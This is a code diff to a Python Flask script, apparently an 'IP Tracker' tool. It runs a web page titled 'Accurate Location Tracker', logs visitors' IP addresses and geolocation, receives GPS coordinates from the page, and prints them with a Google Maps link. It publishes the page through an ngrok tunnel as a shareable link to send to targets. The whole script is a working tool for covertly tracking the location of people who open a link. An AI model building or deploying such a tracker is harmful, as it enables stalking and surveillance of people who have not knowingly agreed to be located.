@@ -3,22 +3,18 @@ import datetime
 import os
 import time
 import subprocess
+import socket
 from flask import Flask, request, render_template_string
 from threading import Thread
 
 app = Flask(__name__)
 
-HTML_BASIC = """
-<!doctype html>
-<html><head><title>Welcome</title></head>
-<body><h2>Thanks for visiting</h2><p>Your IP has been logged.</p></body>
-</html>
-"""
-
 HTML_IMMEDIATE = """
 <!DOCTYPE html>
 <html>
-<head><title>Accurate Location Tracker</title></head>
+<head>
+  <title>Accurate Location Tracker</title>
+</head>
 <body>
   <h2>Thanks for visiting!</h2>
   <p>Your IP has been logged.</p>
@@ -61,12 +57,12 @@ def get_location(ip):
                 "Time": datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
             }
     except:
-        pass
-    return {"IP": ip, "Error": "Could not get location"}
+        return {"IP": ip, "Error": "Could not retrieve location"}
+    return {"IP": ip, "Error": "Unknown error"}
 
 @app.route('/')
 def index():
-    return render_template_string(HTML_BASIC)
+    return render_template_string("<h2>Thanks for visiting</h2><p>Your IP has been logged.</p>")
 
 @app.route('/immediate')
 def immediate():
@@ -80,7 +76,7 @@ def log_ip():
     for k, v in data.items():
         print(f"{k}: {v}")
     print("----------------------------\n")
-    return "Logged"
+    return "IP logged"
 
 @app.route('/submit_location', methods=["POST"])
 def submit_location():
@@ -88,93 +84,66 @@ def submit_location():
     lat = data.get("latitude")
     lon = data.get("longitude")
     accuracy = data.get("accuracy")
-    print("\n--- GPS Location ---")
+
+    print("\n--- Accurate Location Captured (GPS) ---")
     print(f"Latitude: {lat}")
     print(f"Longitude: {lon}")
-    print(f"Accuracy: {accuracy}m")
+    print(f"Accuracy: {accuracy} meters")
     print(f"Map: https://www.google.com/maps?q={lat},{lon}")
-    print("---------------------\n")
-    return "Location received"
+    print(f"Time: {datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
+    print("----------------------------------------\n")
+    return "Location received!"
+
+def is_port_in_use(port):
+    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
+        return s.connect_ex(("localhost", port)) == 0
+
+def run_flask():
+    if is_port_in_use(5000):
+        print("[!] Port 5000 is already in use. Trying to continue...")
+    app.run(host="0.0.0.0", port=5000)
 
 def download_ngrok():
     if not os.path.isfile("ngrok"):
+        print("[•] Downloading ngrok...")
         os.system("wget https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-arm.zip -O ngrok.zip")
-        os.system("unzip ngrok.zip && rm ngrok.zip && chmod +x ngrok")
+        os.system("unzip ngrok.zip && rm ngrok.zip")
+        os.system("chmod +x ngrok")
 
 def start_ngrok():
-    token = input("Enter your Ngrok authtoken: ").strip()
+    os.system("pkill -f ngrok > /dev/null 2>&1")
+    token = input("Enter your Ngrok Authtoken: ").strip()
     download_ngrok()
     os.system(f"./ngrok authtoken {token}")
-    process = subprocess.Popen(["./ngrok", "http", "5000"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+    ngrok_process = subprocess.Popen(["./ngrok", "http", "5000"], stdout=subprocess.DEVNULL, stderr=subprocess.STDOUT)
+    time.sleep(5)
 
-    public_url = ""
-    for _ in range(20):
+    try:
+        tunnels = requests.get("http://localhost:4040/api/tunnels").json()
+        for tunnel in tunnels['tunnels']:
+            if tunnel['proto'] == 'https':
+                public_url = tunnel['public_url']
+                print(f"[✓] Ngrok HTTPS tunnel: {public_url}/immediate")
+                return ngrok_process
+        print("[✗] No HTTPS tunnel found.")
+        ngrok_process.terminate()
+    except Exception as e:
+        print(f"[✗] Failed to get Ngrok URL: {e}")
+        ngrok_process.terminate()
+    return None
+
+def main():
+    ngrok = start_ngrok()
+    if ngrok:
+        flask_thread = Thread(target=run_flask)
+        flask_thread.start()
         try:
-            tunnels = requests.get("http://127.0.0.1:4040/api/tunnels").json()
-            public_url = tunnels["tunnels"][0]["public_url"]
-            break
-        except:
-            time.sleep(1)
-
-    if public_url:
-        print(f"\n\033[92m[✓] Sharable URL: {public_url}/immediate\033[0m")
-    else:
-        print("\033[91m[✗] Failed to fetch Ngrok URL.\033[0m")
-        process.terminate()
-    return process
-
-def run_flask():
-    app.run(host="0.0.0.0", port=5000)
-
-def ip_lookup():
-    ip = input("Enter IP to lookup: ").strip()
-    data = get_location(ip)
-    for k, v in data.items():
-        print(f"{k}: {v}")
-
-def generate_link_basic():
-    ngrok_process = start_ngrok()
-    flask_thread = Thread(target=run_flask)
-    flask_thread.start()
-    try:
-        while flask_thread.is_alive():
-            time.sleep(1)
-    except KeyboardInterrupt:
-        ngrok_process.terminate()
-
-def generate_link_advanced():
-    ngrok_process = start_ngrok()
-    flask_thread = Thread(target=run_flask)
-    flask_thread.start()
-    try:
-        while flask_thread.is_alive():
-            time.sleep(1)
-    except KeyboardInterrupt:
-        ngrok_process.terminate()
-
-def banner():
-    print("\033[92m" + """
-╔════════════════════════════════════════════════╗
-║          IP Tracker by Mohimanul-TVM          ║
-╚════════════════════════════════════════════════╝
-""" + "\033[0m")
-
-def menu():
-    banner()
-    while True:
-        print("\n[1] Track location by IP")
-        print("[2] Generate basic IP logger")
-        print("[3] Generate GPS + IP logger")
-        print("[0] Exit")
-        opt = input("Choose option: ").strip()
-        if opt == '1':
-            ip_lookup()
-        elif opt == '2':
-            generate_link_basic()
-        elif opt == '3':
-            generate_link_advanced()
-        elif opt == '0':
-            break
+            while flask_thread.is_alive():
+                time.sleep(1)
+        except KeyboardInterrupt:
+            print("\n[!] Exiting...")
+            ngrok.terminate()
+            flask_thread.join()
 
 if __name__ == "__main__":
-    menu()
+    main()
